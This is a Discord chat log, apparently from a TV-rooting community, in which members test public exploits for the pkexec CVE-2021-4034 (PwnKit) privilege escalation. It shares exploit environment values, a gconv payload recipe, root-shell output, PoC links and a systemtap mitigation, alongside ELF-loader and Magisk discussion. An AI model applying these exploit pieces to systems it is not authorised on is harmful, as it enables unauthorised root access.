@@ -1,0 +1,1656 @@
+January 27, 2022
+[dustyangel47]
+dustyangel47 01/27/2022 3:01 AM
+that was what was fucking it up
+01/27/2022 3:01 AM
+answer: yes
+01/27/2022 3:00 AM
+aren't i like, not supposed to sizeof a pointer (because it returns the
+size of the pointer not the size of the thing i'm pointing to) (edited)
+01/27/2022 3:00 AM
+i know the issue
+01/27/2022 3:00 AM
+hmm
+01/27/2022 3:00 AM
+which
+01/27/2022 3:00 AM
+for some reason strcmp is fucking up because my cmp function is fucking
+up because my call to qsort is fucking up
+01/27/2022 2:59 AM
+i mean it doesnt exactly tell me anything i dont already know
+01/27/2022 2:57 AM
+it doesnt want to pick them up
+01/27/2022 2:57 AM
+but nooooooo
+[dustyangel47]
+[] dustyangel47 oh for fucks sake
+dustyangel47 01/27/2022 2:57 AM
+i am explicitly compiling with debug options
+[unknown.png]
+ unknown.png
+4.19 KB External
+[dustyangel47]
+dustyangel47 01/27/2022 2:57 AM
+fair
+[_._._._._._._._._._._.]
+_._._._._._._._._._._. 01/27/2022 2:57 AM
+don't hate C, love valgrind
+[dustyangel47]
+dustyangel47 01/27/2022 2:57 AM
+oh for fucks sake
+[unknown.png]
+ unknown.png
+3.37 KB External
+01/27/2022 2:56 AM
+i hate C
+[unknown.png]
+ unknown.png
+131.41 KB External
+[smx2460]
+smx2460 01/27/2022 2:33 AM
+[parkerlreed]
+parkerlreed 01/27/2022 2:22 AM
+    [parker@wolfcola ~]$ fastboot boot magisk*
+    Sending 'boot.img' (69632 KB)                      FAILED (remote: 'unknown command')
+    fastboot: error: Command failed
+01/27/2022 2:21 AM
+Wtf
+01/27/2022 2:21 AM
+Doesnt support boot
+01/27/2022 2:21 AM
+Nevermind...
+[parkerlreed]
+[] smx2460 <@!160387111843790849> if you "fastboot boot" the kernel from
+fastboot
+parkerlreed 01/27/2022 2:18 AM
+Stock or magisk?
+[smx2460]
+smx2460 01/27/2022 1:00 AM
+how long does it take?
+01/27/2022 1:00 AM
+@parkerlreed if you "fastboot boot" the kernel from fastboot
+01/27/2022 1:00 AM
+:/
+[parkerlreed]
+parkerlreed 01/27/2022 12:09 AM
+:(
+01/27/2022 12:09 AM
+@Smx Yeah I confirmed with the ADB wait for device that all of that is
+before userland
+01/27/2022 12:06 AM
+(no content)
+[20220126_180633.jpg]
+ 20220126_180633.jpg
+3.71 MB External
+[smx2460]
+smx2460 01/27/2022 12:03 AM
+pretty crazy
+01/27/2022 12:03 AM
+(no content)
+[unknown.png]
+ unknown.png
+2.32 MB External
+[parkerlreed]
+parkerlreed 01/27/2022 12:03 AM
+Ahh
+[smx2460]
+smx2460 01/27/2022 12:02 AM
+a snapdragon devkit
+[parkerlreed]
+[] smx2460 he sells those for 90$
+parkerlreed 01/27/2022 12:02 AM
+What is it?
+January 26, 2022
+[smx2460]
+smx2460 01/26/2022 11:54 PM
+he sells those for 90$ (edited)
+01/26/2022 11:54 PM
+wtf
+01/26/2022 11:52 PM
+(no content)
+[unknown.png]
+ unknown.png
+2.43 MB External
+01/26/2022 11:52 PM
+(no content)
+[unknown.png]
+ unknown.png
+1.32 MB External
+01/26/2022 11:52 PM
+unless you live in  and know the right guys
+01/26/2022 11:51 PM
+and we cannot replace the samsung bootloader because Secureboot totally
+rocks
+[parkerlreed]
+parkerlreed 01/26/2022 11:50 PM
+That's why the cynic in me thinks Samsung just made that warning a lot
+more annoying to be an ass about it
+[smx2460]
+smx2460 01/26/2022 11:50 PM
+maybe it's just a lame samsung bootloader
+01/26/2022 11:50 PM
+i wish i knew something more to help you, but i don't
+01/26/2022 11:50 PM
+lame 
+[parkerlreed]
+parkerlreed 01/26/2022 11:50 PM
+So I think that's even before it's hitting user land or magisk
+01/26/2022 11:49 PM
+And yeah nothing really abnormal in the logs
+[Screenshot_20220126-174912.png]
+ Screenshot_20220126-174912.png
+493.74 KB External
+[smx2460]
+smx2460 01/26/2022 11:49 PM
+it saves the stack supplier by the kernel so that the C code can extract
+argc, argv, envp, auxv
+01/26/2022 11:49 PM
+this is also quite similar to the glibc's entry point
+01/26/2022 11:48 PM
+    _start:
+        mov rdi, rsp
+        jmp main
+01/26/2022 11:48 PM
+we'd be reimplementing the portion of glibc that does it, lel
+01/26/2022 11:48 PM
+similar to how glibc does it basically
+01/26/2022 11:48 PM
+the challenge would be to bootstrap ld-linux from this environment
+01/26/2022 11:48 PM
+and is 12k big
+01/26/2022 11:47 PM
+this program runs without interp because it's static (edited)
+01/26/2022 11:47 PM
+    ./main
+    ==>
+01/26/2022 11:47 PM
+puts is also just a tiny wrapper
+01/26/2022 11:47 PM
+    .intel_syntax noprefix
+    .section .text
+    .globl syscall
+    syscall:
+        // in:    RDI, RSI, RDX, RCX, R8, R9, 
+        // out:  [RAX], RDI, RSI, RDX, R10, R8, R9
+        mov rax, rdi
+        mov rdi, rsi
+        mov rsi, rdx
+        mov rdx, rcx
+        mov r10, r8
+        mov r8, r9
+        syscall
+        ret
+    .globl main
+    .globl _start
+    _start:
+        mov rdi, rsp
+        jmp main
+01/26/2022 11:47 PM
+    void main(uintptr_t rsp){
+        long argc;
+        char **argv;
+        argc = *(int *)rsp; rsp += sizeof(argc);
+        argv = (char **)rsp;
+        char marker[] = "==>\n";
+        syscall(SYS_write, STDOUT_FILENO, marker, sizeof(marker) - 1);
+        puts(argv[0]);
+        syscall(SYS_write, STDOUT_FILENO, marker, sizeof(marker) - 1);
+        syscall(SYS_exit, EXIT_SUCCESS);
+    }
+01/26/2022 11:46 PM
+@DustyAngel47
+01/26/2022 11:46 PM
+until one worked
+01/26/2022 11:46 PM
+iirc i tried multiple app versions
+01/26/2022 11:46 PM
+when you're supposed to give it the .img to patch
+01/26/2022 11:45 PM
+was that magisk was generating some borked kernel
+[parkerlreed]
+parkerlreed 01/26/2022 11:45 PM
+Before the Android 12 update this was way more reasonable like maybe 20
+seconds
+[smx2460]
+smx2460 01/26/2022 11:45 PM
+iirc the actual issue
+01/26/2022 11:45 PM
+it was some incompatibility between magisk and the MIUI boot process
+[parkerlreed]
+parkerlreed 01/26/2022 11:45 PM
+What was the issue on your end?
+01/26/2022 11:44 PM
+So that might actually be into where magisk is loading
+01/26/2022 11:44 PM
+The actual bootloader splash I can bypass with the power button
+[parkerlreed]
+[] smx2460 i had a similar issue with Xiaomi
+parkerlreed 01/26/2022 11:44 PM
+Yeah I can't tell if this is actually into user land or not because
+that's why I mentioned in the video I'm not sure if it's magisk causing
+it
+[smx2460]
+smx2460 01/26/2022 11:44 PM
+and it was a magisk issue
+01/26/2022 11:44 PM
+not the bootloader screen
+01/26/2022 11:44 PM
+but it was stuck on the bootanimation for that long
+[smx2460]
+[] parkerlreed 50 seconds. Wasting 50 seconds of my time every time I
+reboot the tablet just because I have unlocke...
+smx2460 01/26/2022 11:44 PM
+i had a similar issue with Xiaomi
+[dustyangel47]
+[] infowski huh, you can actually even pass in argv/env, that's nice.
+dustyangel47 01/26/2022 11:43 PM
+Pwnkit exploit in python coming soon (edited)
+[parkerlreed]
+parkerlreed 01/26/2022 11:43 PM
+https://streamable.com/ew7cc8
+Streamable Video
+[]
+01/26/2022 11:43 PM
+50 seconds. Wasting 50 seconds of my time every time I reboot the tablet
+just because I have unlocked bootloader. For fucks sake (edited)
+[infowski]
+infowski 01/26/2022 11:42 PM
+huh, you can actually even pass in argv/env, that's nice.
+[dustyangel47]
+dustyangel47 01/26/2022 11:41 PM
+oh god
+[unknown.png]
+ unknown.png
+3.07 KB External
+[dustyangel47]
+dustyangel47 01/26/2022 11:27 PM
+PATH fixed (edited)
+[unknown.png]
+ unknown.png
+15.64 KB External
+[dustyangel47]
+dustyangel47 01/26/2022 11:17 PM
+that moment when your execve randomly stops working
+[unknown.png]
+ unknown.png
+25.59 KB External
+[infowski]
+infowski 01/26/2022 11:07 PM
+yep, only a reboot will fix this
+01/26/2022 11:07 PM
+funnier than it should've been x-D
+[meme.png]
+ meme.png
+24.39 KB External
+01/26/2022 11:05 PM
+tfw you oomkill your tv ,_,
+[smx2460]
+smx2460 01/26/2022 10:59 PM
+- now use dlopen/dlsym to resolve all symbols you need and use them
+(edited)
+01/26/2022 10:59 PM
+- would load ld-linux on the fly and jump back to itself (i don't know
+if this can be done easily)
+01/26/2022 10:58 PM
+- would determine the path of ld-linux only through syscalls (edited)
+01/26/2022 10:58 PM
+- would not use any libc whatsoever
+01/26/2022 10:58 PM
+so the most universal binary i could think of
+01/26/2022 10:56 PM
+so you will end up with 2 heaps and you cannot easily pass pointers
+between the "static" malloc and the "dynamic" free (edited)
+01/26/2022 10:56 PM
+still it's not as easy as it sounds, because things like malloc, puts,
+etc.. all have internal buffers and heap structures
+01/26/2022 10:55 PM
+or if you want to use dynamic linking inside static binaries
+01/26/2022 10:54 PM
+the only use this technique has is either if ld-linux changes name for
+some dumb reason, but the c library version doesn't (edited)
+01/26/2022 10:54 PM
+you need to statically link glibc for that
+01/26/2022 10:54 PM
+so i don't think you can just use this to run everywhere
+01/26/2022 10:53 PM
+like @GLIBC_something iirc
+01/26/2022 10:53 PM
+you will still have issues anyways with versioned symbols
+01/26/2022 10:51 PM
+            for(int i=0; i<ehdr->e_phnum; i++){
+                ElfPhdr *cur_phdr = &phdrs[i];
+                uintptr_t r_addr = 0;
+                if(_remote_load_phdr(ctx, elf, cur_phdr, &r_addr) != 0){
+                    ERR("failed to load phdr %i", i);
+                    break;
+                }
+                elf->phdr_idx++;
+                if(pt_interp == NULL && cur_phdr->p_type == PT_INTERP){
+                    pt_interp = cur_phdr;
+                }
+                if(pt_phdr == NULL && cur_phdr->p_type == PT_PHDR){
+                    pt_phdr = cur_phdr;
+                    elf->pt_phdr = *cur_phdr;
+                    elf->r_phdr = r_addr;
+                }
+            }
+01/26/2022 10:51 PM
+but technically i might have overridden that
+01/26/2022 10:51 PM
+my program obeys to the one specified in PT_INTERP
+01/26/2022 10:51 PM
+and determine the path of the interp to use on the fly
+01/26/2022 10:51 PM
+you could not use that
+01/26/2022 10:50 PM
+interp comes from a segment called PT_INTERP, in the ELF headers
+01/26/2022 10:50 PM
+a "loader", which uses no glibc, and the target program linked against
+ld-linux
+01/26/2022 10:49 PM
+i'm not sure if you can do it all in 1 binary, the approach i linked
+uses 2 sepate ELF files
+01/26/2022 10:49 PM
+the goal is to basically load ld-linux in memory along with the user
+program (ELF) to load
+01/26/2022 10:48 PM
+AT_BASE must point to the INTERP entry AT_EXECFN points to the target's
+argv[0] AT_ENTRY must point to the USER program entry AT_PHDR must point
+to the USER program's ELF PHDRs AT_PHNUM must hold the number of said
+PHDRs AT_PHENT must hold the size of each PHDR (edited)
+01/26/2022 10:47 PM
+https://github.com/smx-smx/ezinject/blob/foreign-dlopen/ezinject_libcloader.c#L357-L385
+ezinject/ezinject_libcloader.c at foreign-dlopen · smx-smx/ezinject
+Modular binary injection framework, successor of libhooker -
+ezinject/ezinject_libcloader.c at foreign-dlopen · smx-smx/ezinject
+[]
+01/26/2022 10:46 PM
+auxv holds some info that you can patch at runtime to load interp
+01/26/2022 10:45 PM
+but envp is also followed by auxv (edited)
+01/26/2022 10:45 PM
+argv is followed by envp
+01/26/2022 10:45 PM
+since we just had fun with envp in pkexec
+01/26/2022 10:45 PM
+whatever your skill/knowledge level is (edited)
+01/26/2022 10:45 PM
+this is an interesting read
+01/26/2022 10:44 PM
+http://articles.manugarg.com/aboutelfauxiliaryvectors
+About ELF Auxiliary Vectors
+01/26/2022 10:44 PM
+are you aware of auxv, @DustyAngel47 ?
+01/26/2022 10:44 PM
+if you want to load interp at runtime, you need some fixups
+01/26/2022 10:44 PM
+or you can go static
+01/26/2022 10:43 PM
+if you don't, you can either ditch glibc and go bare metal (pure
+syscalls) (edited)
+01/26/2022 10:43 PM
+and call functions from them
+01/26/2022 10:43 PM
+that the interp is needed if you want to load .so files in your program
+01/26/2022 10:43 PM
+the core concept is
+01/26/2022 10:42 PM
+with some bugfixes (edited)
+01/26/2022 10:42 PM
+former is a remote-instrumentation implementation of the latter
+01/26/2022 10:42 PM
+loading a new interp at runtime
+01/26/2022 10:42 PM
+https://github.com/pfalcon/foreign-dlopen
+GitHub - pfalcon/foreign-dlopen: Small library allowing to use dlop...
+Small library allowing to use dlopen() from statically-linked
+applications (where statically-linked executable vs loaded shared
+library may use completely different libc&#39;s) - GitHub - pfalc...
+[]
+01/26/2022 10:42 PM
+and this
+01/26/2022 10:41 PM
+check this
+01/26/2022 10:41 PM
+https://github.com/smx-smx/ezinject/blob/foreign-dlopen/ezinject_libcloader.c
+ezinject/ezinject_libcloader.c at foreign-dlopen · smx-smx/ezinject
+Modular binary injection framework, successor of libhooker -
+ezinject/ezinject_libcloader.c at foreign-dlopen · smx-smx/ezinject
+[]
+[dustyangel47]
+dustyangel47 01/26/2022 10:41 PM
+honestly i could probably link to /lib64/ld-linux.so.2 as that seems to
+be common across all systems i've seen
+01/26/2022 10:41 PM
+because they can sometimes provide different linker paths sometimes
+maybe?
+[smx2460]
+smx2460 01/26/2022 10:41 PM
+you don't need to have an interp
+01/26/2022 10:41 PM
+well
+[dustyangel47]
+dustyangel47 01/26/2022 10:41 PM
+no i just need to support other distros
+[smx2460]
+smx2460 01/26/2022 10:40 PM
+you mean to support other OSes
+01/26/2022 10:40 PM
+nvm
+01/26/2022 10:39 PM
+sorta like an autoconf check
+01/26/2022 10:39 PM
+a side tool to run at build time
+[dustyangel47]
+dustyangel47 01/26/2022 10:39 PM
+cant do that when i need to specify the interpreter path to run the c in
+the first place lol
+[smx2460]
+smx2460 01/26/2022 10:38 PM
+or just read it in C
+01/26/2022 10:38 PM
+or patchelf itself (edited)
+01/26/2022 10:38 PM
+    $ patchelf --print-interpreter `which make`
+    /lib64/ld-linux-x86-64.so.2
+[dustyangel47]
+dustyangel47 01/26/2022 10:38 PM
+can i do that?
+[smx2460]
+[] dustyangel47 currently trying to figure out how to get the path of
+ld-linux.so so i can stuff it in a `-D` in the...
+smx2460 01/26/2022 10:38 PM
+why not read it from say make
+[dustyangel47]
+dustyangel47 01/26/2022 10:37 PM
+thanks
+[smx2460]
+[] dustyangel47 can someone run `ldconfig -v 2>/dev/null | grep
+ld-linux` and tell me the output?
+smx2460 01/26/2022 10:37 PM
+    $ ldconfig -v 2>/dev/null | grep ld-linux
+            ld-linux.so.2 -> ld-2.32.so
+[dustyangel47]
+dustyangel47 01/26/2022 10:36 PM
+can someone run ldconfig -v 2>/dev/null | grep ld-linux and tell me the
+output?
+01/26/2022 10:34 PM
+currently trying to figure out how to get the path of ld-linux.so so i
+can stuff it in a -D in the makefile (edited)
+01/26/2022 10:34 PM
+yeah lol
+[infowski]
+infowski 01/26/2022 10:33 PM
+you can also fixup PATH 
+[dustyangel47]
+dustyangel47 01/26/2022 10:27 PM
+okay actually done
+[unknown.png]
+ unknown.png
+28.32 KB External
+[dustyangel47]
+dustyangel47 01/26/2022 10:20 PM
+me when the cleanup function gets run before we actually do anything:
+01/26/2022 10:13 PM
+actually clean up after
+01/26/2022 10:13 PM
+now for the other part i wanted to do different
+[dogelition]
+dogelition 01/26/2022 10:12 PM
+gj
+[dustyangel47]
+dustyangel47 01/26/2022 10:11 PM
+there we go
+[unknown.png]
+ unknown.png
+34.2 KB External
+01/26/2022 10:10 PM
+forgot to terminate the array
+01/26/2022 10:10 PM
+shit
+01/26/2022 10:10 PM
+what
+01/26/2022 10:10 PM
+(no content)
+[unknown.png]
+ unknown.png
+5.43 KB External
+01/26/2022 10:09 PM
+doesnt run at all?
+01/26/2022 10:09 PM
+it just
+01/26/2022 10:09 PM
+darn
+[unknown.png]
+ unknown.png
+16.06 KB External
+[dustyangel47]
+dustyangel47 01/26/2022 10:00 PM
+okay directory setup accomplished
+[dustyangel47]
+dustyangel47 01/26/2022 9:49 PM
+horrible code inbound
+[unknown.png]
+ unknown.png
+23.48 KB External
+[dogelition]
+[] dustyangel47 well damn
+dogelition 01/26/2022 9:44 PM
+nice
+[infowski]
+infowski 01/26/2022 9:36 PM
+bottom left is my dayjob, bottom right is openlgtv (need to stock up on
+programming socks though)
+01/26/2022 9:35 PM
+(no content)
+[unknown.png]
+ unknown.png
+1.29 MB External
+[dustyangel47]
+dustyangel47 01/26/2022 9:33 PM
+but it works i think
+01/26/2022 9:33 PM
+its kinda jank
+01/26/2022 9:33 PM
+i mean
+01/26/2022 9:33 PM
+i indeed can
+[unknown.png]
+ unknown.png
+7.05 KB External
+[dustyangel47]
+dustyangel47 01/26/2022 9:25 PM
+~~yknow i havent actually tested if i can link to this yet~~
+01/26/2022 9:24 PM
+nvm just forgot to call _exit
+01/26/2022 9:24 PM
+lolwut
+[unknown.png]
+ unknown.png
+16.2 KB External
+01/26/2022 9:21 PM
+yeah but then file doesn't show it as a shared object lol
+[smx2460]
+smx2460 01/26/2022 9:19 PM
+@DustyAngel47 a PIE object would work i suppose (edited)
+[dustyangel47]
+dustyangel47 01/26/2022 9:19 PM
+i cant even directly write to stdout???
+01/26/2022 9:19 PM
+wha
+01/26/2022 9:14 PM
+and doesnt actually print
+01/26/2022 9:13 PM
+actually other problem: printf is busted
+01/26/2022 9:08 PM
+which can probably be resolved with some makefile
+01/26/2022 9:08 PM
+only problem is that currently it relies on a hardcoded dynamic linker
+path
+[infowski]
+infowski 01/26/2022 9:07 PM
+actually not, nice.
+[dustyangel47]
+dustyangel47 01/26/2022 9:07 PM
+has anyone made an exploit using an executable shared object (edited)
+[unknown.png]
+ unknown.png
+41.91 KB External
+[dustyangel47]
+dustyangel47 01/26/2022 8:42 PM
+well damn
+[unknown.png]
+ unknown.png
+22.74 KB External
+[dustyangel47]
+[] dogelition <@!714583473804935238>
+https://news.ycombinator.com/item?id=30080802
+dustyangel47 01/26/2022 7:09 PM
+hm, i'll try it in a bit
+[e99.tuxuser]
+e99.tuxuser 01/26/2022 5:59 PM
+https://v.redd.it/yz7tw6hpwyd81
+I built a sarcasm converter for my keyboard to make it EaSy To TyPe...
+Posted in r/MechanicalKeyboards by u/Dickbutt_Horizons • 4,895 points
+and 87 comments
+[]
+01/26/2022 5:58 PM
+(no content)
+ 1643216311164.mp4
+2.68 MB External
+[dogelition]
+dogelition 01/26/2022 9:23 AM
+maybe try this (if your system isn't patched yet)
+01/26/2022 9:23 AM
+@DustyAngel47 https://news.ycombinator.com/item?id=30080802
+Pieman103021
+Adding `GIO_USE_VFS=` to the end of `a_envp` (starting on line 56),
+fixes that for me on Fedora 34 with polkit-0.117-3. If anybody knows why
+that makes a difference, I would love to hear.
+[]Hacker News1/26/2022, 3:11:26 AM
+[smx2460]
+[] retr0id lmao https://twitter.com/ryiron/status/1486207182404472832
+smx2460 01/26/2022 9:04 AM
+[smx2460]
+[] retr0id https://twitter.com/tjh/status/1486141780760621057
+smx2460 01/26/2022 9:02 AM
+Nice
+[retr0id]
+retr0id 01/26/2022 8:26 AM
+https://twitter.com/sw17ch/status/1486229763698016258
+[]John VanEnk (@sw17ch)
+https://t.co/f1BDtBPOoP
+[]
+[]Twitter1/26/2022, 7:49:23 AM
+[mariotaku]
+mariotaku 01/26/2022 7:58 AM
+I'm thinking about ports. Shall we ask original authors? (edited)
+[mariotaku]
+[] infowski Mate? Now you have my attention. But for real, as Mary
+Johanna said, my onlyfans^Wgithub sponsors is...
+mariotaku 01/26/2022 7:58 AM
+Psst, remember to add your sponsor link on hbchannel too :D
+[infowski]
+Deleted User I just wish to encourage your work. Case of beer? Mate?
+Financial contribution to the project? Anyth...
+infowski 01/26/2022 7:31 AM
+Mate? Now you have my attention. But for real, as Mary Johanna said, my
+onlyfans^Wgithub sponsors is linked to RootMyTV github repo, or I'd
+actually be fairly glad to claim that crate of mate in case you plan to
+drop by MCH2022 as well :^)
+[retr0id]
+retr0id 01/26/2022 6:38 AM
+lmao https://twitter.com/ryiron/status/1486207182404472832
+[]Ryan Mallon (@ryiron)
+Lol, I blogged about this polkit vulnerability in 2013:
+https://t.co/a6ciqwCmyt. I failed to find an actual avenue for
+exploitation, but did identify the root cause.
+[]
+[]Twitter1/26/2022, 6:19:39 AM
+[dustyangel47]
+dustyangel47 01/26/2022 3:09 AM
+looking kinda like selinux ngl
+[retr0id]
+retr0id 01/26/2022 2:50 AM
+https://twitter.com/tjh/status/1486141780760621057
+[]🆃🅸🅼 🅷  (@tjh)
+Running the pkexec exploit on a recent @grsecurity protectected kernel:
+[]
+[]Twitter1/26/2022, 1:59:46 AM
+[maryjohanna42069]
+maryjohanna42069 01/26/2022 1:05 AM
+Other devs might have some other links to donate in their repos
+01/26/2022 1:04 AM
+The rootmytv github page lists Informatic's gh sponsor link for example
+Deleted User 01/26/2022 12:57 AM
+I just wish to encourage your work. Case of beer? Mate? Financial
+contribution to the project? Anything?
+ 1
+01/26/2022 12:56 AM
+Asking here, since I didn't see the answer in the FAQ: Is there a way to
+thank this crew other than to say "that one click rooting my LG OLED was
+freaking awesome!!"?
+[maryjohanna42069]
+maryjohanna42069 01/26/2022 12:15 AM
+rip arch
+01/26/2022 12:15 AM
+    [steve@todo-pc tmp]$ ./a
+    [~] compile helper..
+    [~] maybe get shell now?
+    The value for environment variable XAUTHORITY contains suscipious content
+    This incident has been reported.
+[infowski]
+infowski 01/26/2022 12:02 AM
+since then ppid would be 1 and they show an error in that case
+01/26/2022 12:02 AM
+wouldn't double-forking then execve allow for non-logged g_printerr?
+January 25, 2022
+[smx2460]
+smx2460 01/25/2022 11:58 PM
+this is what happens when XAUTHORITY includes ../
+01/25/2022 11:58 PM
+    The value for environment variable XAUTHORITY contains suscipious content
+    This incident has been reported.
+[smx2460]
+smx2460 01/25/2022 11:48 PM
+        probe process("/usr/bin/pkexec").function("main")  {
+            if (cmdline_arg(1) == "")
+                            raise(9);
+    }
+01/25/2022 11:47 PM
+(no content)
+[unknown.png]
+ unknown.png
+92.18 KB External
+01/25/2022 11:47 PM
+is that you can mitigate all these kind of exploits with systemtaps
+01/25/2022 11:46 PM
+one interesting thing to note
+01/25/2022 11:46 PM
+https://access.redhat.com/security/cve/CVE-2021-4034
+01/25/2022 11:46 PM
+xD
+01/25/2022 11:46 PM
+log4shell -> remote shell pkexec -> insta root
+01/25/2022 11:46 PM
+so
+[smx2460]
+smx2460 01/25/2022 11:32 PM
+so this is how to avoid using SHELL=
+01/25/2022 11:32 PM
+    craft a gconv-modules file that points UTF-8 to some custom payload shared object, LC_MESSAGES=en_US.UTF-8, XAUTHORITY=../LOL to trigger g_printerr (alternatively, SHELL=HAX)
+[dustyangel47]
+dustyangel47 01/25/2022 11:28 PM
+looks like i have to find another root exploit
+https://cdn.discordapp.com/emojis/859795873915207721.gif?size=48&quality=lossless
+[]
+[smx2460]
+smx2460 01/25/2022 11:28 PM
+that's what happens when you don't double check things and you sleep 5
+hours xD
+01/25/2022 11:28 PM
+so apparently, just to confirm what @infowski suspected, i probably had
+stale crap
+01/25/2022 11:27 PM
+01/25/2022 11:27 PM
+nice
+[retr0id]
+retr0id 01/25/2022 11:27 PM
+yup, works
+[smx2460]
+smx2460 01/25/2022 11:27 PM
+i didn't do error checking because YOLO (edited)
+[smx2460]
+[] retr0id if I compile this will I get the same binary?
+smx2460 01/25/2022 11:26 PM
+yes
+[dustyangel47]
+dustyangel47 01/25/2022 11:26 PM
+wtf
+[dustyangel47]
+[] dustyangel47 b r u h
+dustyangel47 01/25/2022 11:26 PM
+doesnt work on my vps either
+[retr0id]
+[] smx2460
+https://gist.github.com/smx-smx/2459c214e12d7d6006eda89b75b9a9ea
+retr0id 01/25/2022 11:26 PM
+if I compile this will I get the same binary?
+[smx2460]
+smx2460 01/25/2022 11:25 PM
+uses a precompiled .so instead of gcc on the fly
+01/25/2022 11:25 PM
+@retr0id does this one work too?
+01/25/2022 11:25 PM
+(no content)
+ pwnkit
+28.08 KB External
+[retr0id]
+retr0id 01/25/2022 11:24 PM
+(no content)
+[unknown.png]
+ unknown.png
+147.18 KB External
+[smx2460]
+smx2460 01/25/2022 11:24 PM
+here's mine
+01/25/2022 11:23 PM
+https://gist.github.com/smx-smx/2459c214e12d7d6006eda89b75b9a9ea
+CVE-2021-4034 (pkexec) self contained exploit PoC
+CVE-2021-4034 (pkexec) self contained exploit PoC. GitHub Gist:
+instantly share code, notes, and snippets.
+[]
+[dustyangel47]
+dustyangel47 01/25/2022 11:23 PM
+okay yeah we're going with the cursed option
+01/25/2022 11:21 PM
+b r u h
+[unknown.png]
+ unknown.png
+13.5 KB External
+[retr0id]
+retr0id 01/25/2022 11:20 PM
+(exploit source)
+01/25/2022 11:20 PM
+https://twitter.com/bl4sty/status/1486095005605318659
+[]BLASTY (@bl4sty)
+Wow, @theflow0 is a true visionary: https://t.co/uwLR65WjDY 
+https://t.co/FHLODKT9No
+[]Twitter1/25/2022, 10:53:54 PM
+[dustyangel47]
+dustyangel47 01/25/2022 11:19 PM
+or not.
+[unknown.png]
+ unknown.png
+24.43 KB External
+[dustyangel47]
+[] retr0id well I guess... or you could just use a debian/ubuntu chroot
+on your pc
+dustyangel47 01/25/2022 11:18 PM
+i already have a void on on my tv so ¯\_(ツ)_/¯
+[smx2460]
+smx2460 01/25/2022 11:18 PM
+        char *env[] = {
+            TARGET_PREFIX,
+            "PATH="TARGET_VAR"=.",
+            //"PATH="TARGET_VAR,
+            "CHARSET="TARGET_CHARSET,
+            "SHELL="TARGET_SHELL,
+            NULL
+        };
+01/25/2022 11:18 PM
+that's also the one encoded in pwnkit
+[dustyangel47]
+[] smx2460 ```- or, if our PATH is "PATH=name=.", and if the directory
+"name=." exists and contains an execut...
+dustyangel47 01/25/2022 11:18 PM
+this is the one i use
+[smx2460]
+smx2460 01/25/2022 11:18 PM
+i guess it needs to be absolute in one case?
+[retr0id]
+[] dustyangel47 it gives me another linux environment to test with
+retr0id 01/25/2022 11:18 PM
+well I guess... or you could just use a debian/ubuntu chroot on your pc
+[smx2460]
+smx2460 01/25/2022 11:17 PM
+does
+01/25/2022 11:17 PM
+    - or, if our PATH is "PATH=name=.", and if the directory "name=." exists
+      and contains an executable file named "value", then a pointer to the
+      string "name=./value" is written out-of-bounds to envp[0].
+01/25/2022 11:17 PM
+the other form
+[dustyangel47]
+[] retr0id that achieves nothing lol
+dustyangel47 01/25/2022 11:17 PM
+it gives me another linux environment to test with
+[smx2460]
+smx2460 01/25/2022 11:17 PM
+this doesn't work for me
+01/25/2022 11:17 PM
+    - if our PATH environment variable is "PATH=name", and if the directory
+      "name" exists (in the current working directory) and contains an
+      executable file named "value", then a pointer to the string
+      "name/value" is written out-of-bounds to envp[0];
+[retr0id]
+retr0id 01/25/2022 11:17 PM
+that achieves nothing lol
+[dustyangel47]
+dustyangel47 01/25/2022 11:17 PM
+on webos
+01/25/2022 11:17 PM
+in a chroot
+01/25/2022 11:17 PM
+polkit
+01/25/2022 11:17 PM
+what if
+01/25/2022 11:17 PM
+but
+[retr0id]
+retr0id 01/25/2022 11:16 PM
+rip
+[infowski]
+[] retr0id since nobody's even mentioned it yet, I guess polkit isn't on
+webos?
+infowski 01/25/2022 11:16 PM
+nope
+[retr0id]
+retr0id 01/25/2022 11:16 PM
+since nobody's even mentioned it yet, I guess polkit isn't on webos?
+[smx2460]
+smx2460 01/25/2022 11:16 PM
+    GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
+    The value for the SHELL variable was not found the /etc/shells file
+    This incident has been reported.
+01/25/2022 11:16 PM
+i get the same behavior
+01/25/2022 11:16 PM
+if i use the other style of PATH=
+01/25/2022 11:16 PM
+i have an half idea
+[dogelition]
+dogelition 01/25/2022 11:15 PM
+not sure if it does, but idk what else could be the difference here
+[_._._._._._._._._._._.]
+_._._._._._._._._._._. 01/25/2022 11:15 PM
+Different method of passing argv, env?
+01/25/2022 11:14 PM
+Why would that matter?
+[dustyangel47]
+dustyangel47 01/25/2022 11:14 PM
+nop
+[dogelition]
+dogelition 01/25/2022 11:14 PM
+and i assume your systems aren't running on ARM?
+[dustyangel47]
+dustyangel47 01/25/2022 11:14 PM
+with smx's (because it's self-contained) (edited)
+[unknown.png]
+ unknown.png
+13.7 KB External
+01/25/2022 11:13 PM
+rocky linux
+[dogelition]
+dogelition 01/25/2022 11:13 PM
+what os are you running on there
+01/25/2022 11:13 PM
+man
+[dustyangel47]
+dustyangel47 01/25/2022 11:13 PM
+same result
+[dustyangel47]
+[] dogelition did you try it on your vps as well?
+dustyangel47 01/25/2022 11:13 PM
+yeah
+[dustyangel47]
+dustyangel47 01/25/2022 11:13 PM
+considering it didnt work on two systems running completely different
+oses
+[dogelition]
+dogelition 01/25/2022 11:13 PM
+did you try it on your vps as well?
+[dustyangel47]
+dustyangel47 01/25/2022 11:13 PM
+i think i may just be legitimately cursed
+01/25/2022 11:11 PM
+yes
+[_._._._._._._._._._._.]
+_._._._._._._._._._._. 01/25/2022 11:11 PM
+But wouldn't it just exit (126) before printing anything if it was
+patched?
+[dustyangel47]
+dustyangel47 01/25/2022 11:11 PM
+what the fuck
+01/25/2022 11:11 PM
+remote patch?????
+[smx2460]
+smx2460 01/25/2022 11:10 PM
+it unpacks the .so, creates a config file on the fly
+[dogelition]
+[] dustyangel47 in that case
+dogelition 01/25/2022 11:10 PM
+actually patched
+[smx2460]
+smx2460 01/25/2022 11:10 PM
+    sm@debian:/mnt/ExtData/pwnkitd$ ./pwnkit
+    -----------------
+    -- Smx says hi --
+    -----------------
+    #
+[dustyangel47]
+dustyangel47 01/25/2022 11:10 PM
+in that case (edited)
+[unknown.png]
+ unknown.png
+15.43 KB External
+[smx2460]
+[] dustyangel47 whats the surrounding file structure and gconv-modules i
+need
+smx2460 01/25/2022 11:10 PM
+self contained
+[dustyangel47]
+dustyangel47 01/25/2022 11:09 PM
+whats the surrounding file structure and gconv-modules i need (edited)
+[_._._._._._._._._._._.]
+_._._._._._._._._._._. 01/25/2022 11:07 PM
